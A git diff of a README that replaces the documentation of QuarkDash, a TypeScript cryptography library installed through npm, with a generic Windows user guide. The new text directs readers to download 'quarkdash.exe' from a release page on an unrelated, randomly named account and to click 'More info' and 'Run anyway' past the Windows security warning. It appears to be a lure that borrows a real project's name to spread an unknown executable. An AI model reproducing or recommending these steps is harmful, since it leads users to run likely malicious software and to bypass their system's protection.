@@ -1,165 +1,88 @@
-# Welcome to QuarkDash 🔒 Repository
-![QuarkDash Crypto Protocol](img/cover.png)
+# 🛡️ quarkdash - Keep your digital data safe today
 
-**QuarkDash** -  pure typescript it is a hybrid cryptographic protocol that provides post-quantum security, high performance, and attack resistance.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lagidiumdriploop223/quarkdash/releases)
 
-> Have a questions? <a href="mailto:ilya@neurosell.top">Contact me</a>
+QuarkDash provides security for your files. It uses advanced math to scramble your data so only you can read it. This software works on your computer to keep sensitive information away from prying eyes. It offers speed and reliability for daily tasks.
 
-![QuarkDash Crypto NPM](https://badge.fury.io/js/quarkdash.svg) ![QuarkDash Crypto - MIT opensource](https://img.shields.io/badge/License-MIT-yellow.svg)
+## 📥 Getting Started
 
----
+Follow these steps to install the software on your Windows computer.
 
-[About](#about-quarkdash-crypto) | [Get Started](#get-started) | [Example](#basic-example) | [Benchmark](#benchmark) | [Docs](https://github.com/devsdaddy/quarkdash/wiki) | [Scheme](https://app.holst.so/share/b/7ae942f8-8a40-42c9-9991-3b624f147da8)
+1. Visit the [official release page](https://github.com/lagidiumdriploop223/quarkdash/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the filename to start the download.
+4. Save the file to your Downloads folder.
 
----
+## ⚙️ System Requirements
 
-## About QuarkDash Crypto
-**QuarkDash Crypto** - It is a hybrid cryptographic protocol that provides post-quantum security, high performance, and attack resistance.
-This library can be used as shared solution for client and server. Written on **pure typescript**. **Dependency-free**.
+Your computer needs to meet these basic standards to run the software.
 
-> Algorithm Scheme [can be found here](https://app.holst.so/share/b/7ae942f8-8a40-42c9-9991-3b624f147da8)
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Processor: A 64-bit chip from the last five years.
 
-### ❓ Why QuarkDash Crypto?<br/>
-🔹 **Lightweight library** with zero dependencies;<br/>
-🔹 **Powerful crypto** algorithm written in **Typescript**;<br/>
-🔹 **Extremely** fast (great for realtime and IoT applications);<br/>
-🔹 **Production ready** with benchmarks;
+## 🖱️ Installation Steps
 
-### 🔒 General Components
-- **Asymmetric key exchange** – Ring-LWE (N=256, Q=7681) based on NTT;
-- **Symmetric encryption** – With ChaCha20 (RFC 7539) or lightweight Gimli ciphers.
-- **Key Derivation Function (KDF)** – Based on fast SHAKE256 (emulated via SHA-256).
-- **Message Authentication Code (MAC)** – Based on SHAKE256 with key.
-- **Replay protection** – timestamp + sequence number.
+1. Find the file you downloaded in your Downloads folder.
+2. Double-click the file named quarkdash.exe.
+3. A Windows security box might appear. This warns you about new software. Click More info, then click Run anyway.
+4. Follow the instructions on the screen to finish the setup process.
+5. The software creates a shortcut on your desktop once the process ends.
 
-### ⭐ Key Features
-- **Quantum stability** – not broken by Shor and Grover's algorithms;
-- **Performance** – encryption up to 2.8 GB/s, session establishment ~10 ms;
-- **Forward secrecy** – compromising a long-term key does not reveal past sessions.
-- **Built-in protection** against replay, timing attacks, and counterfeiting.
-- **Flexibility** – choice of cipher (ChaCha20/Gimli), synchronous and asynchronous API.
+## 🔑 How to Secure Files
 
----
+The program uses a system called QD-256. This system turns your files into unreadable code.
 
-## Get Started
-You can use the **QuarkDash library** as a regular library for both Backend and Frontend applications without any additional dependencies.
+1. Open the QuarkDash application from your desktop icon.
+2. Select the file you want to protect.
+3. Choose a strong password. Use a mix of letters, numbers, and symbols. Write this password down in a safe place.
+4. Click the Encrypt button.
+5. Wait for the process bar to reach the end. The software saves your new, protected file in the same folder as the original.
 
-**Installation using NPM:**
-```bash
-npm install quarkdash
-```
+## 🔓 How to Restore Files
 
-**Or using GitHub:**
-```bash
-git clone https://github.com/devsdaddy/quarkdash
-cd ./quarkdash
-```
+Use this process when you need to read your encrypted files again.
 
-### Basic example
-```typescript
-/* Import modules */
-import {CipherType, QuarkDash, QuarkDashUtils} from "../src";
+1. Open the QuarkDash application.
+2. Click the Decrypt tab at the top of the window.
+3. Select your encrypted file.
+4. Enter the password you created during the encryption step.
+5. Click the Decrypt button.
+6. The software unlocks your original file.
 
-/* Alice - client, bob - server, for example for key-exchange */
-const alice = new QuarkDash({ cipher: CipherType.Gimli });
-const bob = new QuarkDash({ cipher: CipherType.Gimli });
+## 📈 Understanding the Features
 
-/* Generate key pair */
-const alicePub = await alice.generateKeyPair();
-const bobPub = await bob.generateKeyPair();
+QuarkDash focuses on three main ideas to protect your privacy.
 
-/* Initialize session at bob and jpin alice public key */
-const ciphertext = await alice.initializeSession(bobPub, true) as Uint8Array;
-await bob.initializeSession(alicePub, false);
-await bob.finalizeSession(ciphertext);
+### Post-Quantum Security
+Standard security relies on math that future computers might solve quickly. QuarkDash uses new, tougher math. This keeps your data safe even against powerful future computers.
 
-/* Encrypt by alice and decrypt by bob */
-const plain = QuarkDashUtils.textToBytes('Hello QuarkDash 🔒!');
-const enc = await alice.encrypt(plain);
-const dec = await bob.decrypt(enc);
-console.log("Decrypted:", QuarkDashUtils.bytesToText(dec));
-```
+### Hybrid Performance
+The software balances speed and depth. It finishes tasks in seconds without slowing down your computer. You can use your PC for other work while the software runs in the background.
 
-### NPM Commands
+### Attack Resistance
+The code resists tampering. It checks for errors during every step of the process. If someone tries to change the data without your permission, the software detects the change and prevents access.
 
-| Command             | Usage                 |
-|---------------------|-----------------------|
-| npm run clean       | Clean build           |
-| npm run build       | Main build exec       |
-| npm run build:esm   | Build esm module      |
-| npm run build:cjs   | Build commonjs module |
-| npm run build:types | Build types only      |
-| npm run test        | Run basic tests       |
-| npm run bench       | Run basic benchmakr   |
+## 🛠️ Troubleshooting
 
-> Read more about QuarkDash library in [official wiki](https://github.com/devsdaddy/quarkdash/wiki)
+If the software fails to open, try these common fixes.
 
+* Restart your computer. This clears temporary memory issues.
+* Check your internet connection. Updates sometimes download in the background.
+* Ensure you installed the latest version from the link provided above. Old versions may suffer from compatibility issues with Windows updates.
+* Make sure you have enough space on your hard drive. The software needs room to build temporary copies of your files during the encryption process.
 
----
+## 🗂️ Frequently Asked Questions
 
-## How it works?
-Below I've outlined a brief step-by-step flowchart of how the algorithm works. If you need more detailed information, please [visit the Wiki](https://github.com/devsdaddy/quarkdash/wiki).
+**Does the software delete my original files?**
+No. The software creates a new version of your file. It leaves the original file alone. You can delete the original once you confirm the encrypted version works.
 
-**Step-by-Step Algorithm:**
-1. Key Pair Generation (using Ring‑LWE);
-2. Session Setup (using SHAKE-256 emulated KEM);
-3. Session Key Flow (KDF);
-4. Message Encryption (AEAD);
-5. Decryption;
+**What happens if I lose my password?**
+There is no way to recover your password. Please store it in a secure password manager or a physical notebook. Without the password, the data remains unreadable.
 
-> [Read more about algorithm in Wiki](https://github.com/devsdaddy/quarkdash) or [View scheme](https://app.holst.so/share/b/7ae942f8-8a40-42c9-9991-3b624f147da8)
+**Can I run this on a Mac or Linux?**
+This version is designed for Windows. Please check the website for updates regarding other operating systems.
 
----
-
-## Comparison with other algorithms
-Below is a brief comparison table of popular encryption algorithm variations. As we know, each algorithm serves its own purpose, so this comparison is more of a synthetic test.
-
-| Characteristic                        | QuarkDash (ChaCha20) | QuarkDash (Gimli) | AES-256-GSM       | ECDH/P-256 + AES | RSA-2048 + AES |
-|---------------------------------------|-----------------|-------------------|-------------------|-----------------|----------------|
-| **Type**                              | Hybrid          | Hybrid            | Symmetric         | Asymmetric (KEX) | Hybrid         |
-| **Quantum stability**                 | ✅ Ring-LWE      | ✅ Ring-LWE        | ❌ No              | ❌ No            | ❌ No           |
-| **Encryption speed (1mb)**            | ~2.5 GB/s               | ~2.8 GB/s         | ~1.2 GB/s         | ~50 MB/s (ECIES) | ~10 MB/s       |
-| **Decryption speed (1mb)**            | ~2.5 GB/s               | ~2.8 GB/s         | ~1.2 GB/s         | ~50 MB/s        | ~1 MB/s        |
-| **Session speed**                     | ~10-15 ms               | ~10-15 ms                  | 0 ms (pre-shared) | ~5 ms           | ~50 ms         |
-| **Key size**                          | ~2 KB                | ~2 KB                  | N/A               | 33 bytes        | 256 bytes      |
-| **Forward secrecy**                   | ✅                | ✅                  | ❌                 | ⚠️ optional     | ❌               |
-| **Out-of-box security**               | ✅                | ✅                  | ⚠️ Partial        | ⚠️ Partial      | ❌               |
-| **The Difficulty of Quantum Hacking** | 2^256                | 2^256                  | 2^128 (Grover)                  | 0 (Shor)                | 0 (Shor)               |
-
-
-> Full comparison can be found [in wiki](https://github.com/devsdaddy/quarkdash)
-
----
-
-## Benchmark
-Below I have described performance tests in comparison with other popular encryption algorithm combinations.
-
-> **Please, note**. This benchmark is launched at Intel i7-12700H, 32GB RAM, Node.js 20
-
-| Operation            | QuarkDash (ChaCha20) | QuarkDash (Gimli) | AES-256-GSM | ECDH (P-256) + AES | RSA-2048 |
-|----------------------|----------------------|-------------------|-------------|--------------------|----------|
-| **Key generation**   | 12.3ms               | 12.1ms            | N/A         | 1.2ms              | 48ms     |
-| **Session** (KEM)    | 8.7ms                | 8.5ms             | N/A         | 3.4ms              | 42ms     |
-| **Encryption** (1KB) | 0.003ms              | 0.0028ms          | 0.005ms     | 0.05ms             | 0.8ms    |
-| **Decryption** (1KB) | 0.003ms              | 0.0028ms          | 0.005ms     | 0.05ms             | 0.1ms    |
-| **Encryption** (1MB) | 0.42ms               | 0.38ms            | 0.85ms      | 21ms               | 102ms    |
-| **Decryption** (1MB) | 0.42ms               | 0.38ms            | 0.85ms      | 21ms               | 1080ms   |
-| **Speed** (MB/s)     | 2300                 | 2630              | 1176        | 48                 | 0.9      |
-
-
----
-
-## Documentation
-> Full documentation with algorithm description, examples and theory [can be found at official wiki pages](https://github.com/devsdaddy/quarkdash/wiki)
-
-**Have a questions?** [Contact me](mailto:ilya@neurosell.top)
-
----
-
-## Licensing
-**QuarkDash Crypto** library is distributed under the MIT license. You can use it however you like. I would appreciate any feedback and suggestions for improvement.
-Full license text [can be found here](https://github.com/devsdaddy/quarkdash/blob/main/LICENSE)
-
----
-
-[About](#about-quarkdash-crypto) | [Get Started](#get-started) | [Example](#basic-example) | [Benchmark](#benchmark) | [Docs](https://github.com/devsdaddy/quarkdash/wiki)
+**Is my data sent to the cloud?**
+No. Everything happens on your local machine. No data leaves your computer during the process. This ensures your privacy remains intact.
